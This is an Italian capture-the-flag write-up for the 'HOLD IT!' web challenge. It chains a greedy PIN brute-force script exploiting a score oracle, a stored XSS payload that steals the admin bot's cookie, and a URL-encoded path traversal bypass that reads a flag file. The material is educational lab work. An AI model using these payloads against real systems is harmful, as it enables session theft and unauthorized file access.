# HOLD IT!

**Competizione:** ITSCyberGame <br>
**Categoria:** Web <br>
**Servizio:** `sfide.itscybergame.it:<port_number>`

---

## Descrizione

> "HOLD IT! ... (OK... ora ho qualcosa, promesso)"

Un'applicazione web che simula un desktop Windows XP. L'obiettivo è recuperare un file di evidenza nascosto sul sistema.

---

## Soluzione

### 1. Ricognizione iniziale

La root `/` serve un player **Objection.lol** (Ace Attorney) con uno script JS inline che, al termine della scena, sblocca un pulsante che reindirizza a `/login-page`:

```javascript
const LAST_LINE = "Forse dovrei dire al mio collega di controllare se c'è qualcosa sul computer della vittima!";
const TARGET_URL = "/login-page";
// Quando la stringa compare nel DOM → mostra il bottone → redirect a /login-page
```

Accedendo direttamente a `/login-page` si trova un form di login stile Windows XP che richiede un PIN numerico a 8 cifre.

### 2. PIN brute-force tramite score oracle

Il backend risponde alle richieste POST su `/login` con un JSON contenente un campo `score`:

```json
{"debug": "checksum mismatch", "score": 184, "status": "wrong"}
```

Lo score è una **misura di distanza** dal PIN corretto: più basso è il valore, più ci si avvicina. Questo consente un attacco di ottimizzazione greedy — si fissa ogni cifra una alla volta scegliendo il valore che minimizza lo score:

```python
import requests

base = 'http://sfide.itscybergame.it:<port_number>'
best_pin = '44444444'  # punto di partenza con score basso

for position in range(8):
    best_score = current_score
    best_digit = int(best_pin[position])

    for digit in range(10):
        candidate = best_pin[:position] + str(digit) + best_pin[position+1:]
        r = requests.post(f'{base}/login', json={'pin': candidate})
        score = r.json().get('score', 999)
        if r.json().get('status') == 'ok':
            print(f"PIN trovato: {candidate}")
            exit()
        if score < best_score:
            best_score, best_digit = score, digit

    best_pin = best_pin[:position] + str(best_digit) + best_pin[position+1:]
```

**PIN trovato:** `53817429`

### 3. Enumerazione del desktop

Dopo il login si accede a `/desktop`, un desktop Windows XP simulato con 5 finestre:

- **Internet Explorer** (`/browser/{page}`) — tab: `home`, `notes`, `admin`
- **My Documents** — file: `browser_history.txt`, `passwords.txt`, `work_notes.doc`
- **Notepad** — contenuto: *"PIN updated after last meeting... maybe related to that strange sequence..."*
- **Recycle Bin**, **Control Panel**

La tab `/browser/admin` risponde **403** per l'utente normale.

La tab `/browser/home` contiene un dettaglio rilevante:

> *"Legacy formatting filter disabled after complaints."*

### 4. XSS stored → cookie steal

`/browser/notes` accetta input via POST e lo renderizza nel DOM **senza sanitizzazione** (il filtro è disabilitato). La nota della vittima `tom` conferma che le note vengono lette dall'amministratore:

> *"All submitted notes are reviewed manually. The old filter is still disabled because it broke formatting."*

L'admin bot legge le note e le risponde con `Reviewed.`, XSS stored confermato. Payload iniettato per estrarre il cookie admin:

```html
<script>
fetch('/browser/notes', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'note=COOKIE:' + encodeURIComponent(document.cookie)
});
</script>
```

Alla successiva GET di `/browser/notes` compare la nota postata dal bot:

```
[admin] - note #11: ADMIN COOKIE: auth=admin-super-token-7f4e9c
```

### 5. Path traversal → flag

Con il cookie admin si accede a `/browser/admin` (200 OK), che espone un file viewer:

```
Archive viewer for internal documents.
- meeting.txt   → /admin/view?file=meeting.txt
- todo.txt      → /admin/view?file=todo.txt
- users.log     → /admin/view?file=users.log

Internal archive base path: /data/admin_files/
```

Il file `users.log` rivela:

```
[INFO] Evidence archive moved to /data/evidence/
[INFO] Final report stored as flag.txt
```

Il parametro `file` blocca i traversal con `../` in chiaro (400 Blocked), ma non valida i caratteri URL-encoded. Bypass con slash codificato:

```
GET /admin/view?file=..%2fevidence%2fflag.txt
Cookie: auth=admin-super-token-7f4e9c
```

Il server decodifica `%2f` → `/` prima di risolvere il path, bypassando il filtro → lettura di `/data/evidence/flag.txt`.

---

## Flag

```
flag{...}
```

---

## Conclusioni

La challenge incatena 3 vulnerabilità:

1. **Score oracle sul login**: la risposta del backend include una metrica di distanza dal PIN corretto, riducendo lo spazio di ricerca da 10^8 a 80 richieste con ottimizzazione greedy.

2. **XSS stored**: il form note renderizza HTML senza filtri. Il bot admin che processa le note diventa il vettore di esecuzione: il payload ruba il cookie di sessione privilegiato e lo re-inietta come nota leggibile dall'attaccante.

3. **Path traversal via URL encoding**: il blocco su `../` è implementato su stringa raw ma non sui caratteri URL-encoded (`%2f`). La sanitizzazione deve avvenire **dopo** la decodifica, non prima.